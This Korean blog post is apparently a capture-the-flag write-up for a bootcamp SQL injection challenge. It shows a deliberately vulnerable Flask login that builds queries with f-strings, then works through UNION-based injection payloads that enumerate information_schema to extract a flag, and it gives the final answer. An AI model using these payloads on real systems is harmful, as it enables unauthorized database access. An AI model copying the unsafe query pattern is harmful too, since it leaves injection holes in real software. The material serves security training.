---
title: "[Writeup] Knockon Bootcamp - 1.2 SQL Injection - DB(100)"
categories:
  - Web Hacking
tags:
  - Writeup
  - Knockon Bootcamp
  - SQL Injection
  - DB
last_modified_at: 2024-08-24T04:31:00-05:00
published: true
---

|

## 문제

<http://war.knock-on.org:10002/>

![1.2 SQL Injection - DB 1](/assets/images/writeup/web-hacking/knock-on/1-2_SQL_Injection_1.png)

![1.2 SQL Injection - DB 2](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_2.png)

![1.2 SQL Injection - DB 3](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_3.png)

|

### 목표

---

서버의 데이터베이스에 접근하여 정보 탈취하기

|

|

### 공격 기법

---

SQL Injection

|

|

|

## 문제 코드

```python
from flask import Flask, request, render_template, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import text
import os

app = Flask(__name__)

MYSQL_DATABASE = os.getenv("MYSQL_DATABASE")
MYSQL_USER = os.getenv("MYSQL_USER")
MYSQL_PASSWORD = os.getenv("MYSQL_PASSWORD")
ADMIN_FLAG = os.getenv("ADMIN_FLAG")
LOGIN_FLAG = os.getenv("LOGIN_FLAG")
MYSQL_HOST = "db"

app.config["SQLALCHEMY_DATABASE_URI"] = (
    f"mysql+pymysql://{MYSQL_USER}:{MYSQL_PASSWORD}@{MYSQL_HOST}/{MYSQL_DATABASE}"
)
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
db = SQLAlchemy(app)


class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(80), nullable=False)


@app.route("/")
def home():
    return render_template("index.html")


@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    query = None
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        query = text(
            f"SELECT * FROM user WHERE username = '{username}' AND password = '{password}'"
        )
        with db.engine.connect() as connection:
            result = connection.execute(query)
            user = result.fetchone()
        if user and user[1] == "admin":
            return redirect(url_for("success", username=user[1], flag=LOGIN_FLAG))
        elif user:
            return redirect(url_for("success", username=user[1]))
        else:
            error = "Invalid Credentials"
    return render_template("login.html", error=error, query=query)


@app.route("/success")
def success():
    username = request.args.get("username", "Unknown")
    flag = request.args.get("flag", "So.. what?")
    return render_template("success.html", username=username, flag=flag)


if __name__ == "__main__":
    db.create_all()
    app.run(debug=True, host="0.0.0.0", port=8080)

```

|

|

|

## 코드 분석

### user 테이블

---

| id | username | password |
|:---|:---------|:---------|
| 1 | guest | password |
| 2 | admin | strong_admin_password_it_cant_be_leak |

[<1.1 SQL Injection Login>](https://parkseunghan.github.io/web%20hacking/knock-on-challenges-1-1/)에서 구한 user 테이블

|

|

### login()

---

```python
query = text(
            f"SELECT * FROM user WHERE username = '{username}' AND password = '{password}'"
        )
        with db.engine.connect() as connection:
            result = connection.execute(query)
            user = result.fetchone()
```

생성된 쿼리 결과의 첫 번째 행을 `user` 변수에 저장

**이 부분을 이용해야됨**

위 쿼리로 정상적으로 실행된다면, `user` 변수는 user 테이블의 행을 나타내겠지만

user 테이블이 아닌 **DB에 대한 정보**를 얻어야 하기 때문에 쿼리를 조작하여 `user` 변수 자리에 다른 쿼리 결과를 넣어야 함

|

```python
if user and user[1] == "admin":
	return redirect(url_for("success", username=user[1], flag=LOGIN_FLAG)
elif user:
	return redirect(url_for("success", username=user[1]))
```

`user`가 존재하면(쿼리가 유효하면) `user[1]`이 화면에 출력됨

조작된 쿼리 실행 결과를 `user` 변수에 저장하면, `user[1]` 자리에 내가 원하는 쿼리 결과를 화면에 띄울 수 있음

|

|

|

## 문제 풀이

```sql
SELECT * FROM user WHERE username = '{username}' AND password = '{password}'
```
 
DB 데이터를 얻기 위해서는 새로운 쿼리가 필요함

이를 위해 **union**을 사용
 
|

```sql
select * from user where username = 'admin' -- 첫 번째 쿼리
union
select 1 -- 두 번째 쿼리
```

`union`사용 시 두 쿼리는 **동일한 열 개수**를 가져야 함
예를 들어,

첫 번째 쿼리의 열 개수가 한 개라면 정상 동작하지만, 그 이외의 경우 정상 동작하지 않음

|

```sql
select * from user where username = 'admin' -- 첫 번째 쿼리
union
select 1, 2, 3, ... -- 두 번째 쿼리
```

이 문제에서는 코드 분석을 통해 user 테이블의 열 개수가 세 개라는 것을 알 수 있지만,

열 개수를 정확히 모를 때에는

쿼리가 정상적으로 실행될 때까지 두 번째 쿼리의 열 개수를 늘려가며 첫 번째 쿼리의 열 개수를 알아낼 수 있음

|

| 

```sql
' union select 1,2,3 -- 1
```

![1.2 SQL Injection - DB 4](/assets/images/writeup/web-hacking/knock-on/1-2_SQL_Injection_2.png)

첫 번째 열 개수가 세 개라는 것과 

두 번째 쿼리의 두 번째 열의 데이터인 '2'가 화면에 출력된다는 것을 알아냄

|

```sql
SELECT * FROM user WHERE username = ''
union
select 1,2,3 -- 1' AND password = '{password}'
```

두 번쨰 쿼리의 두 번쨰 열의 데이터가 화면에 출력되는 이유는

user 테이블에서 `username`이 `''`인 결과는 없기 때문에 첫 번째 쿼리의 결과가 빈 값이 되어

**login()** 함수의 `user` 변수에는 두 번째 쿼리의 첫 번째 행이 담기게 됨

즉,

user[0] = 1

user[1] = 2

user[2] = 3

|

```sql
' union select 1,(새 쿼리),3 -- 1
```

따라서 두 번째 열에 얻고자 하는 데이터베이스에 대한 쿼리를 작성하면

그 결과가 화면에 출력될 것임

|

|

### information_schema

---

데이터베이스를 확인하기 위해 필요한 건 **`information_schema`**라는 DB임

|

```sql
select 1 from 데이터베이스.테이블명
```

우선 `information_schema`가 존재하는지 확인을 해야하는데

위와 같은 방법으로 테이블이 존재하는지 확인할 수 있음

|

```sql
'
union
select 1 from information_schema.테이블명 limit 0,1
```

여기선 열의 개수가 1이 되어야 하기 때문에 결과를 하나로 제한하기 위해 **limit**을 사용

|

하지만 `information_schema`의 테이블명을 모르기 때문에 MySQL을 실행하여 알아보겠음

|

```sh
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| board              |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
```

DB 목록을 확인해보면 `information_schema`, `mysql`, `performance_schema`, `sys` 네 가지 테이블이 기본적으로 존재하는 걸 알 수 있음

|

```sh
mysql> use information_scheme;
mysql> show tables;
+---------------------------------------+
| Tables_in_information_schema          |
+---------------------------------------+
| ADMINISTRABLE_ROLE_AUTHORIZATIONS     |
| APPLICABLE_ROLES                      |
| *CHARACTER_SETS                        |
| CHECK_CONSTRAINTS                     |
| *COLLATIONS                            |
| *COLLATION_CHARACTER_SET_APPLICABILITY |
| *COLUMNS                               |
| COLUMNS_EXTENSIONS                    |
| *COLUMN_PRIVILEGES                     |
| COLUMN_STATISTICS                     |
| ENABLED_ROLES                         |
| *ENGINES                               |
| *EVENTS                                |
| FILES                                 |
| INNODB_BUFFER_PAGE                    |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_CACHED_INDEXES                 |
| INNODB_CMP                            |
| INNODB_CMPMEM                         |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMP_PER_INDEX                  |
| INNODB_CMP_PER_INDEX_RESET            |
| INNODB_CMP_RESET                      |
| INNODB_COLUMNS                        |
| INNODB_DATAFILES                      |
| INNODB_FIELDS                         |
| INNODB_FOREIGN                        |
| INNODB_FOREIGN_COLS                   |
| INNODB_FT_BEING_DELETED               |
| INNODB_FT_CONFIG                      |
| *INNODB_FT_DEFAULT_STOPWORD            |
| INNODB_FT_DELETED                     |
| INNODB_FT_INDEX_CACHE                 |
| INNODB_FT_INDEX_TABLE                 |
| INNODB_INDEXES                        |
| INNODB_METRICS                        |
| INNODB_SESSION_TEMP_TABLESPACES       |
| INNODB_TABLES                         |
| INNODB_TABLESPACES                    |
| INNODB_TABLESPACES_BRIEF              |
| INNODB_TABLESTATS                     |
| INNODB_TEMP_TABLE_INFO                |
| INNODB_TRX                            |
| INNODB_VIRTUAL                        |
| KEYWORDS                              |
| *KEY_COLUMN_USAGE                      |
| *OPTIMIZER_TRACE                       |
| *PARAMETERS                            |
| *PARTITIONS                            |
| *PLUGINS                               |
| *PROCESSLIST                           |
| *PROFILING                             |
| *REFERENTIAL_CONSTRAINTS               |
| RESOURCE_GROUPS                       |
| ROLE_COLUMN_GRANTS                    |
| ROLE_ROUTINE_GRANTS                   |
| ROLE_TABLE_GRANTS                     |
| *ROUTINES                              |
| *SCHEMATA                              |
| SCHEMATA_EXTENSIONS                   |
| *SCHEMA_PRIVILEGES                     |
| *STATISTICS                            |
| ST_GEOMETRY_COLUMNS                   |
| ST_SPATIAL_REFERENCE_SYSTEMS          |
| ST_UNITS_OF_MEASURE                   |
| *TABLES                                |
| TABLESPACES                           |
| TABLESPACES_EXTENSIONS                |
| TABLES_EXTENSIONS                     |
| *TABLE_CONSTRAINTS                     |
| TABLE_CONSTRAINTS_EXTENSIONS          |
| *TABLE_PRIVILEGES                      |
| *TRIGGERS                              |
| USER_ATTRIBUTES                       |
| *USER_PRIVILEGES                       |
| *VIEWS                                 |
| VIEW_ROUTINE_USAGE                    |
| VIEW_TABLE_USAGE                      |
+---------------------------------------+
79 rows in set (0.00 sec)
```

`information_scheme`의 테이블 확인 결과

문제 서버에는 어떤 테이블들이 존재하는지 확인하기 위해 하나하나 확인해본 결과,

앞에 **'*'**표시가 있는 테이블들은 존재함

|

이 중 데이터베이스 정보를 추출하기 위해서는 다음 세 가지의 테이블이 필요함

`information_schema.SCHEMATA`: 데이터베이스

`information_schema.TABLES`: 테이블

`information_schema.COLUMNS`: 열

|

이외에 존재하는 테이블들에 대한 분석은 [<1.2 SQL Injection DB - 번외>](https://parkseunghan.github.io/web%20hacking/knock-on-challenges-1-2-special/)에서 다루겠음

|

|

### 1. SCHEMATA: 데이터베이스 조회

---

```sh
mysql> select * from information_schema.SCHEMATA;
+--------------+--------------------+----------------------------+------------------------+----------+--------------------+
| CATALOG_NAME | SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH | DEFAULT_ENCRYPTION |
+--------------+--------------------+----------------------------+------------------------+----------+--------------------+
| def          | mysql              | utf8mb4                    | utf8mb4_0900_ai_ci     |     NULL | NO                 |
| def          | information_schema | utf8mb3                    | utf8mb3_general_ci     |     NULL | NO                 |
| def          | performance_schema | utf8mb4                    | utf8mb4_0900_ai_ci     |     NULL | NO                 |
| def          | sys                | utf8mb4                    | utf8mb4_0900_ai_ci     |     NULL | NO                 |
| def          | board              | utf8mb4                    | utf8mb4_0900_ai_ci     |     NULL | NO                 |
+--------------+--------------------+----------------------------+------------------------+----------+--------------------+
5 rows in set (0.00 sec)
```

서버에 있는 데이터베이스를 조회하기 위해 필요한 `information_schema.SCHEMATA`의 컬럼 명을 확인

`SCHEMA_NAME`이 데이터베이스의 이름

|

---

|

```sql
select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1
```

`information_schema.SCHEMATA` 테이블의 첫 번째 `SCHEMA_NAME`

![1.2 SQL Injection - DB 5](/assets/images/writeup/web-hacking/knock-on/1-2_SQL_Injection_3.png)

기본 데이터베이스이므로 패스

|

```sql
select SCHEMA_NAME from information_schema.SCHEMATA limit 1,1
```

두 번째 `SCHEMA_NAME`

![1.2 SQL Injection - DB 6](/assets/images/writeup/web-hacking/knock-on/1-2_SQL_Injection_4.png)

처음 보는 데이터베이스 이름임. 아마 이게 찾고자 하는 DB일 것임

|

```sql
select SCHEMA_NAME from information_schema.SCHEMATA limit 2,1
```

세 번째 `SCHEMA_NAME`도 확인해보면

![1.2 SQL Injection - DB 7](/assets/images/writeup/web-hacking/knock-on/1-2_SQL_Injection_5.png)

없음.

찾고자 하는 DB는 `sqli_lab`임이 확실함

|

|

### 2. TABLES: 테이블 조회

```sh
mysql> select * from information_schema.TABLES limit 2;
+---------------+--------------+--------------------+------------+--------+---------+------------+------------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+-------------+------------+-----------------+----------+---------------------------------------+---------------+
| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME         | TABLE_TYPE | ENGINE | VERSION | ROW_FORMAT | TABLE_ROWS | AVG_ROW_LENGTH | DATA_LENGTH | MAX_DATA_LENGTH | INDEX_LENGTH | DATA_FREE | AUTO_INCREMENT | CREATE_TIME         | UPDATE_TIME | CHECK_TIME | TABLE_COLLATION | CHECKSUM | CREATE_OPTIONS                        | TABLE_COMMENT |
+---------------+--------------+--------------------+------------+--------+---------+------------+------------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+-------------+------------+-----------------+----------+---------------------------------------+---------------+
| def           | mysql        | innodb_table_stats | BASE TABLE | InnoDB |      10 | Dynamic    |          7 |           2340 |       16384 |               0 |            0 |   4194304 |           NULL | 2024-08-09 07:30:57 | NULL        | NULL       | utf8mb3_bin     |     NULL | row_format=DYNAMIC stats_persistent=0 |               |
| def           | mysql        | innodb_index_stats | BASE TABLE | InnoDB |      10 | Dynamic    |         28 |            585 |       16384 |               0 |            0 |   4194304 |           NULL | 2024-08-09 07:30:57 | NULL        | NULL       | utf8mb3_bin     |     NULL | row_format=DYNAMIC stats_persistent=0 |               |
+---------------+--------------+--------------------+------------+--------+---------+------------+------------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+-------------+------------+-----------------+----------+---------------------------------------+---------------+
2 rows in set (0.00 sec)
```

`sqli_lab`DB의 테이블을 조회하기 위해 필요한 `information_schema.TABLES`의 컬럼 명을 확인

데이터베이스 컬럼은 `TABLE_SCHEMA`이고, 테이블 컬럼은 `TABLE_NAME`

|

---

|

```sql
select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = "sqli_lab" limit 0,1
```

`information_schema.TABLES`에서 `TABLE_SCHEMA`가 `sqli_lab`인 것의 `TABLE_NAME`을 조회

첫 번째 `TABLE_NAME`

![1.2 SQL Injection - DB 8](/assets/images/writeup/web-hacking/knock-on/1-2_SQL_Injection_6.png)

flag같은 뭔가 나옴

|

```sql
select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = "sqli_lab" limit 1,1
```

두 번째 `TABLE_NAME`

![1.2 SQL Injection - DB 9](/assets/images/writeup/web-hacking/knock-on/1-2_SQL_Injection_7.png)

user 테이블 등장

|

```sql
select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = "sqli_lab" limit 2,1
```

세 번째 `TABLE_NAME`

![1.2 SQL Injection - DB 10](/assets/images/writeup/web-hacking/knock-on/1-2_SQL_Injection_8.png)

없음

첫 번째 테이블인 `K0{`의 열을 들여다봐야 함

|

|

### 3. COLUMNS: 열 조회

```sh
mysql> select * from information_schema.columns limit 2;
+---------------+--------------+--------------------+---------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+----------------+--------------+------------+-------+---------------------------------+----------------+-----------------------+--------+
| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME         | COLUMN_NAME   | ORDINAL_POSITION | COLUMN_DEFAULT | IS_NULLABLE | DATA_TYPE | CHARACTER_MAXIMUM_LENGTH | CHARACTER_OCTET_LENGTH | NUMERIC_PRECISION | NUMERIC_SCALE | DATETIME_PRECISION | CHARACTER_SET_NAME | COLLATION_NAME | COLUMN_TYPE  | COLUMN_KEY | EXTRA | PRIVILEGES                      | COLUMN_COMMENT | GENERATION_EXPRESSION | SRS_ID |
+---------------+--------------+--------------------+---------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+----------------+--------------+------------+-------+---------------------------------+----------------+-----------------------+--------+
| def           | mysql        | innodb_table_stats | database_name |                1 | NULL           | NO          | varchar   |                       64 |                    192 |              NULL |          NULL |               NULL | utf8mb3            | utf8mb3_bin    | varchar(64)  | PRI        |       | select,insert,update,references |                |                       |   NULL |
| def           | mysql        | innodb_table_stats | table_name    |                2 | NULL           | NO          | varchar   |                      199 |                    597 |              NULL |          NULL |               NULL | utf8mb3            | utf8mb3_bin    | varchar(199) | PRI        |       | select,insert,update,references |                |                       |   NULL |
+---------------+--------------+--------------------+---------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+----------------+--------------+------------+-------+---------------------------------+----------------+-----------------------+--------+
2 rows in set (0.00 sec)
```

`sqli_lab`DB의 `KO{`테이블의 열을 조회하기 위해 필요한 `information_schema.COLUMS`의 컬럼 명을 확인

데이터베이스는 `TABLE_SCHEMA`, 테이블 명은 `TABLE_NAME`, 컬럼 명은 `COLUMN_NAME`

|

---

|

```sql
select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = "K0{" limit 0,1

select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA = "sqli_lab" limit 0,1
```

`information_schema.COLUMNS`에서 `TABLE_NAME`이 `K0{`(또는 `TABLE_SCHEMA`가 `sqli_lab`)인 것의 `COLUMN_NAME`을 조회

첫 번째 `COLUMN_NAME`

![1.2 SQL Injection - DB 11](/assets/images/writeup/web-hacking/knock-on/1-2_SQL_Injection_9.png)

flag 조각이 나옴

|

두 번째 `COLUMN_NAME`부터는 user 테이블에 대한 열이므로 순서대로 id, username, password가 나왔음

|


| TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME |
|: ------------|:-----------|:------------|
| sqli_lab     | K0{        | Und3r_c0    |
| sqli_lab     | user       | id          |
| sqli_lab     | user       | username    |
| sqli_lab     | user       | password    |


정리하면 이런 테이블이 완성됨

|

|

### 4. 열의 데이터 조회

---

앞에서 얻은 결과 종합

| Database | Table | Column |
|:---|:---|:---|
| sqli_lab | k0{ | Und3r_c0 |

|

이제 마지막으로 `Und3r_c0`열에 대한 데이터를 조회하면 됨

|

```sql
select Und3r_c0 from sqli_lab.K0{ limit 0,1
```

하지만 여기서 문제가 발생함

테이블을 참조할 땐 특수문자를 사용할 수 없음

특수문자 `'{'`를 사용하기 위해서는 백틱(`)을 사용해야함

|

```sql
select Und3r_c0 from sqli_lab.`K0{` limit 0,1
```

```js
sqli_lab.`K0{`
`sqli_lab`.`K0{`
두 방식 모두 사용 가능하지만
`sqli_lab.K0{` 는 사용 불가
```

![1.2 SQL Injection - DB 12](/assets/images/writeup/web-hacking/knock-on/1-2_SQL_Injection_10.png)

마지막 플래그 조각을 얻었다

|

### 최종 정리

---

| Database | Table | Column | Column Value |
|:---|:---|:---|:---|
| sqli_lab | k0{ | Und3r_c0 | nstrUct10n} |

|

|

|

## Exploit

```js
username: ' union select 1,(query),3 -- 1

password: 1
```

|

### query

```sql
select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = "sqli_lab" limit 0,1
```

```sql
select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = "K0{" limit 0,1

또는

select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA = "sqli_lab" limit 0,1
```

```sql
select Und3r_c0 from sqli_lab.`K0{` limit 0,1
```

|

### FLAG 

```
K0{Und3r_c0nstrUct10n}
```

|

---